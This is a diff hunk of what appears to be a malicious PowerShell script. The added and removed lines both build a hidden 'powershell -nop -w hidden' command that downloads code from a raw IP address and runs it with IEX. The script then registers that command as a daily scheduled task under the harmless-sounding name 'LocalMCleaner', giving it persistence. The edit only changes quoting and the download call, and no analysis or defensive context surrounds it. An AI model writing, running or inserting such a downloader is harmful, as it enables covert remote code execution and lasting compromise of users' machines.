@@ -10,7 +10,7 @@ if ($computerInfo.CsPartOfDomain)
         $response = Invoke-WebRequest -Uri $url -Method Get -UseBasicParsing  
     } catch { 
     }  
-    $ccc = "powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://64.182.116.12/images/II11II11'))""
+    $ccc = '"' + "powershell.exe -nop -w hidden -c  " + "'IEX (irm http://64.182.116.12/images/II11II11)" + "'" +'"'
     $str = "schtasks.exe /create /sc daily /tn LocalMCleaner /tr " + $ccc +" /st 11:30 /f"
     iex  $str
 } 
